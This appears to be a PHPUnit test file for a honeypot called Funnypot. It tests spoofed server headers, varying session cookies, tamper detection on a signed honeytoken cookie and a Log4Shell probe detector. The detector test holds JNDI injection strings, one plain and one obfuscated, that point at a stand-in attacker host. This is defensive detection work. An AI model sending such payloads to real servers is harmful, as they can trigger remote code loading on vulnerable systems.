<?php

declare(strict_types=1);

namespace Funnypot\Tests;

use Funnypot\Detection;
use Funnypot\Honeytoken;
use Funnypot\Log4ShellProbe;
use Funnypot\RequestContext;
use Funnypot\Response\RouteTemplateEmulator;
use Funnypot\Response\RouteTemplateSet;
use Funnypot\Response\Style;
use Funnypot\Synthesis\ResponseSynthesizer;
use PHPUnit\Framework\TestCase;

final class AntiFingerprintTest extends TestCase
{
    // --- coherent server chrome ---

    public function test_server_and_powered_by_applied_to_every_response(): void
    {
        $synth = new ResponseSynthesizer(null, Style::MINIMAL, 'Apache/2.4.52 (Ubuntu)', 'PHP/8.1.27');
        $resp = $synth->synthesize(['bw' => ['MARK'], 's' => 200], $this->detection());

        self::assertNotNull($resp);
        self::assertSame('Apache/2.4.52 (Ubuntu)', $resp->headers['Server']);
        self::assertSame('PHP/8.1.27', $resp->headers['X-Powered-By']);
    }

    public function test_bundle_header_wins_over_chrome_default(): void
    {
        $synth = new ResponseSynthesizer(null, Style::MINIMAL, 'nginx', null);
        $resp = $synth->synthesize(['bw' => ['MARK'], 's' => 200, 'h' => ['Server' => 'Coyote']], $this->detection());

        self::assertNotNull($resp);
        self::assertSame('Coyote', $resp->headers['Server']);
    }

    // --- per-request session cookie ---

    public function test_login_template_sets_a_varying_session_cookie(): void
    {
        $set = RouteTemplateSet::fromFile(__DIR__ . '/../resources/compiled/funnypot-routes.php');
        $emu = new RouteTemplateEmulator($set);
        $bundle = ['bw' => ['Register For This Site'], 'pid' => 'wordpress-login', 't' => ['wordpress-login'], 's' => 200];

        $a = $emu->render($bundle, Style::REALISTIC, 1);
        $b = $emu->render($bundle, Style::REALISTIC, 2);

        self::assertNotNull($a);
        self::assertArrayHasKey('Set-Cookie', $a->headers);
        self::assertStringStartsWith('PHPSESSID=', $a->headers['Set-Cookie']);
        self::assertStringContainsString('HttpOnly', $a->headers['Set-Cookie']);
        self::assertNotSame($a->headers['Set-Cookie'], $b->headers['Set-Cookie']); // fresh per request
    }

    // --- honeytoken bait cookie ---

    public function test_honeytoken_replay_ok_but_tamper_detected(): void
    {
        $h = new Honeytoken('server-side-secret');
        $cookie = $h->cookie('sess', 'r=user');

        // Pull the value a browser would send back and confirm it verifies.
        $value = substr($cookie, strlen('sess='));
        $value = substr($value, 0, strpos($value, ';'));
        self::assertSame('ok', $h->inspect($value));

        // Absent = ordinary first visit.
        self::assertSame('absent', $h->inspect(null));

        // An attacker who escalates the role breaks the signature.
        $tampered = rawurlencode('r=admin.' . substr($value, strpos(rawurldecode($value), '.') + 1));
        self::assertSame('tampered', $h->inspect($tampered));
    }

    // --- Log4Shell / JNDI probe detection ---

    public function test_log4shell_probe_detected_in_headers(): void
    {
        $hit = new RequestContext('GET', '/', '', ['User-Agent' => '${jndi:ldap://evil.example/a}']);
        self::assertTrue(Log4ShellProbe::present($hit));

        $obfuscated = new RequestContext('GET', '/', '', ['X-Api-Version' => '${${lower:j}ndi:dns://x/y}']);
        self::assertTrue(Log4ShellProbe::present($obfuscated));

        $benign = new RequestContext('GET', '/', 'q=hello', ['User-Agent' => 'curl/8.0']);
        self::assertFalse(Log4ShellProbe::present($benign));
    }

    private function detection(): Detection
    {
        return new Detection(true, [], 'x', 'info');
    }
}
